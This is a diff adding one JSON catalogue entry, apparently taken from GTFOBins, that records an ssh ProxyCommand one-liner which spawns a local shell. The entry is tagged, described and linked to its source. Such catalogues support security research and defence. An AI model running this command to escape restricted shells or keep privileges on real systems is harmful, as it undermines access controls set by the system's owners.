@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-ssh-shell-2",
+  "name": "GTFOBins · ssh (shell) #2",
+  "command": "ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x",
+  "description": "Use ssh to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "ssh",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/ssh/#shell",
+  "upstream_id": "ssh/shell/1",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/ssh/"
+    }
+  ]
+}
